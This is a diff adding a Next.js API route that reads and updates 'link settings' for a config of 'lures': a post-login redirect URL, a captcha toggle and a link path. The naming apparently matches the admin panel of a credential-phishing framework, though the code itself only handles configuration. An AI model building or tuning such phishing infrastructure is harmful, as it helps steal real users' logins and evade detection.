@@ -1,0 +1,49 @@
+import { NextApiRequest, NextApiResponse } from "next";
+import { configService } from "@/services/configService";
+
+export default async function handler(
+  req: NextApiRequest,
+  res: NextApiResponse
+) {
+  try {
+    if (req.method === "GET") {
+      const config = await configService.readConfig();
+      if (!config) {
+        return res.status(200).json({
+          afterLoginRedirect: "",
+          useCaptcha: true,
+          linkPath: "",
+        });
+      }
+
+      // Get values from the first lure, or return defaults
+      const lure = config.lures[0] || {};
+      return res.status(200).json({
+        afterLoginRedirect: lure.redirect_url || "",
+        useCaptcha: lure.redirector === "main",
+        linkPath: (lure.path || "").replace(/^\/+/, ""), // Remove leading slash
+      });
+    } else if (req.method === "POST") {
+      const { afterLoginRedirect, useCaptcha, linkPath } = req.body;
+
+      const success = await configService.updateLinkSettings(
+        afterLoginRedirect || "",
+        useCaptcha || false,
+        linkPath || ""
+      );
+
+      if (success) {
+        return res
+          .status(200)
+          .json({ message: "Settings updated successfully" });
+      } else {
+        return res.status(500).json({ error: "Failed to update settings" });
+      }
+    } else {
+      res.status(405).json({ error: "Method not allowed" });
+    }
+  } catch (error) {
+    console.error("Error handling link settings:", error);
+    res.status(500).json({ error: "Internal server error" });
+  }
+}
